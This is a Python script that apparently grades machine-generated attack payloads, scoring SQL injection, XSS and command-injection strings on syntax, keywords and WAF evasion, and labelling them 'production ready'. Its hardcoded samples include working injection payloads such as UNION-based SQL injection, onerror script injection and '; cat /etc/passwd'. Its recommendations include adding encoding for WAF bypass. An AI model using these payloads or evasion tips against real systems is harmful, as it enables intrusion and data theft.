#!/usr/bin/env python3
"""
Detailed Payload Processing Output
===================================
Shows complete validation details for each processed payload
"""

import re
import json
from pathlib import Path
from typing import List, Dict, Tuple
from enum import Enum


class PayloadQuality(Enum):
    EXCELLENT = "excellent"
    GOOD = "good"
    ACCEPTABLE = "acceptable"
    POOR = "poor"


class DetailedPayloadValidator:
    """Comprehensive payload validator with detailed output"""
    
    def __init__(self, attack_type: str):
        self.attack_type = attack_type
    
    def validate_comprehensive(self, payload: str) -> Dict:
        """Comprehensive validation with detailed output"""
        
        validation_details = {
            "payload": payload,
            "attack_type": self.attack_type,
            "length": len(payload),
            "checks": []
        }
        
        if self.attack_type == "sqli":
            validation_details["checks"] = self._check_sqli(payload)
        elif self.attack_type == "xss":
            validation_details["checks"] = self._check_xss(payload)
        elif self.attack_type == "rce":
            validation_details["checks"] = self._check_rce(payload)
        
        return validation_details
    
    def _check_sqli(self, payload: str) -> List[Dict]:
        """Detailed SQLi validation checks"""
        checks = []
        lower = payload.lower()
        
        # Check 1: Quote Balance
        single_count = payload.count("'")
        double_count = payload.count('"')
        encoded_single = payload.count("%27")
        encoded_double = payload.count("%22")
        
        if single_count % 2 == 0 and encoded_single == 0:
            checks.append({
                "name": "Single Quote Balance",
                "status": "✓ PASS",
                "details": f"Balanced: {single_count} quotes"
            })
        else:
            checks.append({
                "name": "Single Quote Balance",
                "status": "✗ FAIL",
                "details": f"Unbalanced: {single_count} quotes (expected even)"
            })
        
        if double_count % 2 == 0:
            checks.append({
                "name": "Double Quote Balance",
                "status": "✓ PASS",
                "details": f"Balanced: {double_count} quotes"
            })
        else:
            checks.append({
                "name": "Double Quote Balance",
                "status": "✗ FAIL",
                "details": f"Unbalanced: {double_count} quotes (expected even)"
            })
        
        # Check 2: Parenthesis Balance
        paren_open = payload.count("(")
        paren_close = payload.count(")")
        if paren_open == paren_close:
            checks.append({
                "name": "Parenthesis Balance",
                "status": "✓ PASS",
                "details": f"Balanced: {paren_open} pairs"
            })
        else:
            checks.append({
                "name": "Parenthesis Balance",
                "status": "✗ FAIL",
                "details": f"Unbalanced: {paren_open} open, {paren_close} close"
            })
        
        # Check 3: SQL Injection Markers
        markers = ["or", "and", "union", "select", "where"]
        found_markers = [m for m in markers if re.search(rf"\b{m}\b", lower)]
        if found_markers:
            checks.append({
                "name": "SQL Injection Markers",
                "status": "✓ PASS",
                "details": f"Found: {', '.join(found_markers)}"
            })
        else:
            checks.append({
                "name": "SQL Injection Markers",
                "status": "✗ FAIL",
                "details": "No SQL injection markers detected"
            })
        
        # Check 4: Comment Syntax
        if "/*" in payload and "*/" not in payload:
            checks.append({
                "name": "Comment Syntax",
                "status": "⚠ WARNING",
                "details": "Block comment not closed"
            })
        else:
            checks.append({
                "name": "Comment Syntax",
                "status": "✓ PASS",
                "details": "Comment syntax OK"
            })
        
        # Check 5: Special Characters/Encoding
        encoding_types = []
        if "%27" in payload:
            encoding_types.append("URL-encoded quotes")
        if "0x" in payload:
            encoding_types.append("Hex encoding")
        if any(c in payload for c in ["/*", "--", "#"]):
            encoding_types.append("Comment injection")
        
        if encoding_types:
            checks.append({
                "name": "WAF Evasion Techniques",
                "status": "✓ DETECTED",
                "details": ", ".join(encoding_types)
            })
        else:
            checks.append({
                "name": "WAF Evasion Techniques",
                "status": "⚠ NONE",
                "details": "No evasion techniques used"
            })
        
        return checks
    
    def _check_xss(self, payload: str) -> List[Dict]:
        """Detailed XSS validation checks"""
        checks = []
        lower = payload.lower()
        
        # Check 1: Tag Balance
        open_tags = len(re.findall(r"<\w+", payload))
        close_tags = len(re.findall(r"</\w+>", payload))
        if open_tags <= close_tags + 1:
            checks.append({
                "name": "Tag Balance",
                "status": "✓ PASS",
                "details": f"Open: {open_tags}, Close: {close_tags}"
            })
        else:
            checks.append({
                "name": "Tag Balance",
                "status": "✗ FAIL",
                "details": f"Unbalanced: {open_tags} open, {close_tags} close"
            })
        
        # Check 2: Script Tag Closure
        if "<script" in lower:
            if "</script>" in lower:
                checks.append({
                    "name": "Script Tag Closure",
                    "status": "✓ PASS",
                    "details": "Script tag properly closed"
                })
            else:
                checks.append({
                    "name": "Script Tag Closure",
                    "status": "✗ FAIL",
                    "details": "Script tag not closed"
                })
        
        # Check 3: Quote Balance in Attributes
        quote_single = payload.count("'")
        quote_double = payload.count('"')
        if quote_single % 2 == 0 or quote_double % 2 == 0:
            checks.append({
                "name": "Quote Balance",
                "status": "✓ PASS",
                "details": f"Single: {quote_single}, Double: {quote_double}"
            })
        else:
            checks.append({
                "name": "Quote Balance",
                "status": "✗ FAIL",
                "details": f"Unbalanced quotes"
            })
        
        # Check 4: XSS Event Handlers
        event_patterns = [r"on\w+\s*=", r"<script", r"alert\("]
        found_events = [p for p in event_patterns if re.search(p, payload, re.IGNORECASE)]
        if found_events:
            checks.append({
                "name": "XSS Vectors",
                "status": "✓ PASS",
                "details": f"Event handlers/scripts detected"
            })
        else:
            checks.append({
                "name": "XSS Vectors",
                "status": "✗ FAIL",
                "details": "No XSS vectors found"
            })
        
        # Check 5: Encoding Detection
        encoding_types = []
        if "&#" in payload:
            encoding_types.append("HTML entity encoding")
        if "%3c" in payload or "%3e" in payload:
            encoding_types.append("URL encoding")
        if "\\" in payload:
            encoding_types.append("Escape sequences")
        
        if encoding_types:
            checks.append({
                "name": "WAF Evasion Techniques",
                "status": "✓ DETECTED",
                "details": ", ".join(encoding_types)
            })
        else:
            checks.append({
                "name": "WAF Evasion Techniques",
                "status": "⚠ NONE",
                "details": "No evasion techniques detected"
            })
        
        return checks
    
    def _check_rce(self, payload: str) -> List[Dict]:
        """Detailed RCE validation checks"""
        checks = []
        
        # Check 1: Command Separator
        separators = [";", "|", "&", "||", "&&"]
        found_seps = [s for s in separators if s in payload]
        if found_seps:
            checks.append({
                "name": "Command Separator",
                "status": "✓ PASS",
                "details": f"Found: {', '.join(found_seps)}"
            })
        else:
            checks.append({
                "name": "Command Separator",
                "status": "✗ FAIL",
                "details": "No command separator found"
            })
        
        # Check 2: Quote Balance
        quote_single = payload.count("'")
        quote_double = payload.count('"')
        if quote_single % 2 == 0 and quote_double % 2 == 0:
            checks.append({
                "name": "Quote Balance",
                "status": "✓ PASS",
                "details": f"Single: {quote_single}, Double: {quote_double}"
            })
        else:
            checks.append({
                "name": "Quote Balance",
                "status": "✗ FAIL",
                "details": "Unbalanced quotes"
            })
        
        # Check 3: Command Substitution
        if "$(" in payload:
            close_count = payload.count(")")
            open_count = payload.count("$(")
            if open_count == close_count:
                checks.append({
                    "name": "Command Substitution",
                    "status": "✓ PASS",
                    "details": f"Balanced: {open_count} substitutions"
                })
            else:
                checks.append({
                    "name": "Command Substitution",
                    "status": "✗ FAIL",
                    "details": "Unbalanced command substitution"
                })
        
        # Check 4: Command Detection
        commands = ["cat", "ls", "whoami", "id", "pwd", "echo"]
        found_cmds = [c for c in commands if c in payload.lower()]
        if found_cmds:
            checks.append({
                "name": "Command Detection",
                "status": "✓ PASS",
                "details": f"Found: {', '.join(found_cmds)}"
            })
        else:
            checks.append({
                "name": "Command Detection",
                "status": "⚠ WARNING",
                "details": "No common commands detected"
            })
        
        # Check 5: Encoding Detection
        encoding_types = []
        if "'" in payload or '"' in payload:
            encoding_types.append("Quote usage")
        
        checks.append({
            "name": "WAF Evasion Techniques",
            "status": "⚠ MINIMAL",
            "details": "Consider adding encoding for WAF bypass"
        })
        
        return checks


def score_payload(payload: str, attack_type: str) -> Dict:
    """Score payload on multiple dimensions"""
    
    # Grammar score
    validator = DetailedPayloadValidator(attack_type)
    checks = validator.validate_comprehensive(payload)
    
    passed = sum(1 for c in checks["checks"] if "PASS" in c["status"])
    total = len(checks["checks"])
    grammar_score = passed / total if total > 0 else 0.5
    
    # Reward score (heuristic)
    reward_score = 0.5
    if len(payload) > 15:
        reward_score += 0.2
    
    keywords = {
        "sqli": ["select", "union", "where", "or", "and"],
        "xss": ["script", "alert", "onclick", "onerror"],
        "rce": ["cat", "ls", "whoami", "cmd"],
    }
    
    kw_list = keywords.get(attack_type, [])
    kw_count = sum(1 for kw in kw_list if kw in payload.lower())
    reward_score += min(kw_count * 0.08, 0.2)
    reward_score = min(max(reward_score, 0), 1.0)
    
    # Evasion score
    evasion_score = 0
    if any(e in payload for e in ["%27", "%22", "0x", "&#", "/*", "--"]):
        evasion_score = 0.3
    
    # Semantic score
    semantic_score = 0.5 + min(kw_count * 0.1, 0.3)
    
    # Combined score
    combined = grammar_score * 0.35 + reward_score * 0.35 + evasion_score * 0.15 + semantic_score * 0.15
    
    # Quality level
    if combined >= 0.85:
        quality = PayloadQuality.EXCELLENT
    elif combined >= 0.70:
        quality = PayloadQuality.GOOD
    elif combined >= 0.50:
        quality = PayloadQuality.ACCEPTABLE
    else:
        quality = PayloadQuality.POOR
    
    return {
        "grammar_score": round(grammar_score, 4),
        "reward_score": round(reward_score, 4),
        "evasion_score": round(evasion_score, 4),
        "semantic_score": round(semantic_score, 4),
        "combined_score": round(combined, 4),
        "quality_level": quality.value,
        "passed_checks": passed,
        "total_checks": total
    }


def print_detailed_payload_output(attack_type: str, payloads: List[str]):
    """Print detailed output for each payload"""
    
    print("\n" + "="*100)
    print(f"DETAILED PAYLOAD PROCESSING OUTPUT - {attack_type.upper()}")
    print("="*100)
    
    for idx, payload in enumerate(payloads, 1):
        print(f"\n{'='*100}")
        print(f"PAYLOAD #{idx}")
        print(f"{'='*100}")
        
        # Original payload
        print(f"\n📝 PAYLOAD:")
        print(f"   {payload}")
        print(f"   Length: {len(payload)} characters")
        
        # Validation checks
        validator = DetailedPayloadValidator(attack_type)
        validation = validator.validate_comprehensive(payload)
        
        print(f"\n✓ VALIDATION CHECKS ({len(validation['checks'])} total):")
        for check in validation["checks"]:
            status_symbol = "✓" if "PASS" in check["status"] else "✗" if "FAIL" in check["status"] else "⚠"
            print(f"   {status_symbol} {check['name']:30} | {check['status']:15} | {check['details']}")
        
        # Scoring
        scores = score_payload(payload, attack_type)
        
        print(f"\n📊 QUALITY SCORING:")
        print(f"   Grammar Score:   {scores['grammar_score']:.4f} ({scores['passed_checks']}/{scores['total_checks']} checks passed)")
        print(f"   Reward Score:    {scores['reward_score']:.4f}")
        print(f"   Evasion Score:   {scores['evasion_score']:.4f}")
        print(f"   Semantic Score:  {scores['semantic_score']:.4f}")
        print(f"   ─────────────────────────")
        print(f"   COMBINED SCORE:  {scores['combined_score']:.4f}")
        
        # Quality level with emoji
        quality_emoji = {
            "excellent": "🌟",
            "good": "✅",
            "acceptable": "⚠️",
            "poor": "❌"
        }
        emoji = quality_emoji.get(scores["quality_level"], "❓")
        print(f"   QUALITY LEVEL:   {emoji} {scores['quality_level'].upper()}")
        
        # Production readiness
        is_production_ready = scores["combined_score"] >= 0.70
        status = "✓ YES - PRODUCTION READY" if is_production_ready else "✗ NO - NEEDS IMPROVEMENT"
        print(f"\n🚀 PRODUCTION READY: {status}")
        
        # Recommendations
        print(f"\n💡 RECOMMENDATIONS:")
        if scores["grammar_score"] < 0.7:
            print(f"   • Fix syntax errors to improve grammar score")
        if scores["reward_score"] < 0.7:
            print(f"   • Add more keywords or increase payload complexity")
        if scores["evasion_score"] == 0:
            print(f"   • Consider adding WAF evasion techniques (encoding, comments, etc.)")
        if scores["combined_score"] >= 0.70:
            print(f"   • ✓ Payload meets production quality standards")
        
        print()


def main():
    """Main execution"""
    
    # SQLi payloads
    sqli_payloads = [
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "1' UNION SELECT extractvalue(1, concat(0x7e, database())) --",
        "1%27 OR %27%27=%27",
        "admin' OR 1=1 --",
    ]
    
    # XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert(1)>",
    ]
    
    # RCE payloads
    rce_payloads = [
        "; ls -la",
        "; cat /etc/passwd",
        "; echo 'hello'; whoami",
        "| whoami",
        "& id",
    ]
    
    print("\n" + "🚀 "*30)
    print("ADVANCED POST-RL PAYLOAD VALIDATOR")
    print("DETAILED OUTPUT FOR PROCESSED PAYLOADS")
    print("🚀 "*30)
    
    # Process each attack type
    print_detailed_payload_output("sqli", sqli_payloads)
    print_detailed_payload_output("xss", xss_payloads)
    print_detailed_payload_output("rce", rce_payloads)
    
    # Summary
    print("\n" + "="*100)
    print("SUMMARY")
    print("="*100)
    
    all_payloads = [
        ("sqli", sqli_payloads),
        ("xss", xss_payloads),
        ("rce", rce_payloads),
    ]
    
    for attack_type, payloads in all_payloads:
        print(f"\n{attack_type.upper()}:")
        excellent = sum(1 for p in payloads if score_payload(p, attack_type)["quality_level"] == "excellent")
        good = sum(1 for p in payloads if score_payload(p, attack_type)["quality_level"] == "good")
        acceptable = sum(1 for p in payloads if score_payload(p, attack_type)["quality_level"] == "acceptable")
        poor = sum(1 for p in payloads if score_payload(p, attack_type)["quality_level"] == "poor")
        
        total = len(payloads)
        production_ready = excellent + good
        
        print(f"  Total:            {total}")
        print(f"  Production Ready: {production_ready}/{total} ({production_ready/total*100:.1f}%)")
        print(f"    🌟 Excellent:   {excellent}")
        print(f"    ✅ Good:        {good}")
        print(f"    ⚠️  Acceptable:  {acceptable}")
        print(f"    ❌ Poor:        {poor}")
    
    print("\n" + "="*100 + "\n")


if __name__ == "__main__":
    main()
